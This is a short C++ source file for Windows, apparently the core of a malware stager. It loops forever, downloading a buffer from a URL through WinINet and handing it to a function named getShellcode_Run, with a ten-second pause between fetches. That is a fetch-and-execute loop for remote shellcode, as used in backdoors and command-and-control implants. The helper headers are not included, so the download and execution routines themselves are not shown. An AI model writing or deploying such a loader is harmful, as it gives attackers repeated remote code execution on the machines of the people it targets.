#include <iostream>
#include <iterator>
#include <windows.h>
#include <wininet.h>
#include <stdio.h>

#pragma comment(lib, "wininet")

#include "get_buf.h"
#include "shell_code_run.h"

void doing(const char* url)
{
    while (true)
    {
        char recvbuf[DEFAULT_BUFLEN];
        get_buf(url, recvbuf);

        getShellcode_Run(recvbuf);

        Sleep(10000);
    }
};